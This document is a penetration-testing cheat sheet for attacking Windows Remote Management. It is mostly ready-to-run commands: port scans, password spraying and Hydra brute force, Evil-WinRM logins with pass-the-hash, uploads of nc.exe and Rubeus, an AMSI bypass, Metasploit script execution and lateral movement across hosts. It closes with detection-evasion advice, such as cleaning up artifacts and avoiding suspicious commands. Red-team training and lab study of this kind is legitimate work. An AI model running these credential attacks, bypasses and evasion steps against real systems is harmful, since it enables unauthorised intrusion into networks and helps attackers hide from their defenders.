# WinRM Enumeration

Enumerate and exploit Windows Remote Management service to gain remote PowerShell access and execute commands on Windows systems.
WinRM is commonly enabled on Windows servers and can provide direct shell access with valid credentials.

## Port Scanning
```bash
# Scan WinRM ports
nmap -p 5985,5986 -sV -sC 10.10.10.10

# 5985: HTTP (unencrypted)
# 5986: HTTPS (encrypted)
```

## Check WinRM Access

### NetExec (formerly CrackMapExec)
```bash
# Test WinRM access
nxc winrm 10.10.10.10 -u user -p password

# Look for "Pwn3d!" indicator
# Pwn3d! means you can WinRM into the system

# Test with hash
nxc winrm 10.10.10.10 -u user -H ntlmhash

# Test multiple hosts
nxc winrm 10.10.10.0/24 -u user -p password

# Test with user list
nxc winrm 10.10.10.10 -u users.txt -p password
```

### PowerShell Test-WSMan
```powershell
# Test if WinRM is accessible
Test-WSMan -ComputerName 10.10.10.10

# Test with credentials
Test-WSMan -ComputerName 10.10.10.10 -Credential (Get-Credential)
```

## Evil-WinRM

### Basic Connection
```bash
# Connect with password
evil-winrm -i 10.10.10.10 -u user -p 'password'

# Connect with hash (Pass-the-Hash)
evil-winrm -i 10.10.10.10 -u user -H ntlmhash

# Connect with domain account
evil-winrm -i 10.10.10.10 -u 'domain\user' -p 'password'
evil-winrm -i 10.10.10.10 -u user@domain.local -p 'password'

# Connect via HTTPS (port 5986)
evil-winrm -i 10.10.10.10 -u user -p 'password' -S
```

### Evil-WinRM File Operations
```powershell
# Upload file
*Evil-WinRM* PS C:\> upload /opt/tools/nc.exe

# Download file
*Evil-WinRM* PS C:\> download C:\Users\user\file.txt

# Upload to specific location
*Evil-WinRM* PS C:\> upload /opt/tools/nc.exe C:\Users\Public\nc.exe
```

### Evil-WinRM Advanced Features
```powershell
# Load PowerShell script
*Evil-WinRM* PS C:\> Invoke-Binary /opt/tools/Rubeus.exe

# Execute local script on remote
*Evil-WinRM* PS C:\> menu
*Evil-WinRM* PS C:\> Invoke-Binary

# Bypass AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# Load PowerShell module
*Evil-WinRM* PS C:\> Import-Module .\PowerView.ps1
```

## PowerShell Remoting

### Enter-PSSession
```powershell
# Interactive session
Enter-PSSession -ComputerName 10.10.10.10 -Credential (Get-Credential)

# With domain credentials
$cred = Get-Credential domain\user
Enter-PSSession -ComputerName 10.10.10.10 -Credential $cred

# Exit session
Exit-PSSession
```

### Invoke-Command
```powershell
# Execute single command
Invoke-Command -ComputerName 10.10.10.10 -Credential $cred -ScriptBlock {whoami}

# Execute multiple commands
Invoke-Command -ComputerName 10.10.10.10 -Credential $cred -ScriptBlock {
    whoami
    hostname
    ipconfig
}

# Execute on multiple computers
Invoke-Command -ComputerName 10.10.10.10,10.10.10.11 -Credential $cred -ScriptBlock {whoami}

# Execute script file
Invoke-Command -ComputerName 10.10.10.10 -Credential $cred -FilePath C:\scripts\script.ps1
```

### New-PSSession
```powershell
# Create persistent session
$session = New-PSSession -ComputerName 10.10.10.10 -Credential $cred

# Use session
Invoke-Command -Session $session -ScriptBlock {whoami}

# Enter session
Enter-PSSession -Session $session

# Remove session
Remove-PSSession -Session $session
```

## Metasploit WinRM
```bash
# WinRM login scanner
use scanner/winrm/winrm_login
set RHOSTS 10.10.10.10
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# WinRM command execution
use exploit/windows/winrm/winrm_script_exec
set RHOSTS 10.10.10.10
set USERNAME user
set PASSWORD password
set FORCE_VBS true
run
```

## Ruby WinRM
```ruby
require 'winrm'

conn = WinRM::Connection.new(
  endpoint: 'http://10.10.10.10:5985/wsman',
  user: 'user',
  password: 'password'
)

conn.shell(:powershell) do |shell|
  output = shell.run('whoami')
  puts output.stdout
end
```

## WinRM Brute Force

### Hydra
```bash
hydra -l user -P passwords.txt 10.10.10.10 winrm
```

### NetExec
```bash
# Password spray
nxc winrm 10.10.10.0/24 -u users.txt -p 'Password123' --continue-on-success

# Brute force single user
nxc winrm 10.10.10.10 -u user -p passwords.txt
```

## WinRM Configuration

### Check WinRM Status (Local)
```powershell
# Check if WinRM is running
Get-Service WinRM

# Check WinRM configuration
winrm get winrm/config

# Check listeners
winrm enumerate winrm/config/listener
```

### Enable WinRM (Local)
```powershell
# Quick setup
Enable-PSRemoting -Force

# Configure WinRM service
winrm quickconfig

# Allow all hosts (insecure)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -Force

# Add specific host
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.10.10.10" -Force
```

### Configure WinRM Listener
```powershell
# Create HTTP listener
winrm create winrm/config/Listener?Address=*+Transport=HTTP

# Create HTTPS listener
winrm create winrm/config/Listener?Address=*+Transport=HTTPS @{Hostname="host";CertificateThumbprint="thumbprint"}
```

## Pass-the-Hash with WinRM

### Evil-WinRM PTH
```bash
# Pass NTLM hash
evil-winrm -i 10.10.10.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ntlmhash
```

### Impacket wmiexec (Alternative)
```bash
# WMI execution with hash
impacket-wmiexec -hashes :ntlmhash administrator@10.10.10.10
```

## Lateral Movement via WinRM

### Execute Commands on Multiple Hosts
```powershell
# Define target computers
$computers = @("10.10.10.10", "10.10.10.11", "10.10.10.12")

# Execute command on all
Invoke-Command -ComputerName $computers -Credential $cred -ScriptBlock {
    whoami
    hostname
}
```

### Copy Files via WinRM
```powershell
# Create session
$session = New-PSSession -ComputerName 10.10.10.10 -Credential $cred

# Copy file to remote
Copy-Item -Path C:\local\file.txt -Destination C:\remote\ -ToSession $session

# Copy file from remote
Copy-Item -Path C:\remote\file.txt -Destination C:\local\ -FromSession $session
```

## WinRM with Kerberos

### Request Kerberos Ticket
```bash
# Get TGT
kinit user@DOMAIN.LOCAL

# List tickets
klist

# Connect with Kerberos
evil-winrm -i dc01.domain.local -r DOMAIN.LOCAL
```

## Notes

**Ports:**
- 5985: HTTP (unencrypted WinRM)
- 5986: HTTPS (encrypted WinRM)
- Default protocol: HTTP unless explicitly configured for HTTPS

**Authentication:**
- Supports Windows Authentication (Kerberos, NTLM)
- Requires valid domain or local credentials
- Pass-the-Hash works with NTLM authentication
- Kerberos authentication requires proper DNS and time sync

**Requirements:**
- User must be member of "Remote Management Users" group or Administrators
- WinRM service must be running and configured
- Firewall must allow WinRM ports
- Network connectivity to target

**Evil-WinRM Features:**
- File upload/download capabilities
- PowerShell script execution
- AMSI bypass built-in
- Supports Pass-the-Hash
- Can load PowerShell modules and scripts

**PowerShell Remoting:**
- Built into Windows (PowerShell 2.0+)
- Uses WinRM as transport protocol
- Supports one-to-one and one-to-many remoting
- Can create persistent sessions
- Supports background jobs

**Security Considerations:**
- HTTP (5985) transmits credentials in clear text (wrapped in NTLM/Kerberos)
- HTTPS (5986) provides encryption
- Requires authentication (no anonymous access)
- Logs created in Windows Event Log
- Can be detected by EDR/monitoring solutions

**Common Use Cases:**
- Remote administration
- Lateral movement in AD environments
- Post-exploitation command execution
- File transfer between systems
- Automated deployment and configuration

**Troubleshooting:**
- "Access Denied": User not in Remote Management Users group
- "Connection refused": WinRM not enabled or firewall blocking
- "Authentication failed": Invalid credentials or authentication method
- "Timeout": Network connectivity issues or wrong port

**Detection Evasion:**
- Use HTTPS (5986) instead of HTTP
- Avoid suspicious commands (whoami, net user, etc.)
- Use native Windows tools when possible
- Limit session duration
- Clean up uploaded files and artifacts
